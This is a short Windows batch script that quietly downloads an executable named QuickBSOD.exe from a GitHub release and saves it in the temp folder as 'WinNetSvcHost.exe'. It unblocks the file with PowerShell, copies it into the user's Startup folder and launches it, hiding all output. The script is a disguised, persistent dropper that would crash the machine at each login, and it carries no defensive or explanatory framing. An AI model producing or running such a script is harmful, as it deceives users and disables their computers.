@echo off
set "dlurl=https://github.com/jpiechowka/quick-bsod/releases/download/1.0/QuickBSOD.exe"
curl -L -o "%TEMP%\WinNetSvcHost.exe" %dlurl% >nul 2>&1
powershell -c "Unblock-File -Path $env:TEMP\WinNetSvcHost.exe" >nul 2>&1
mkdir %LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\ >nul 2>&1
copy "%TEMP%\WinNetSvcHost.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
start "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinNetSvcHost.exe"
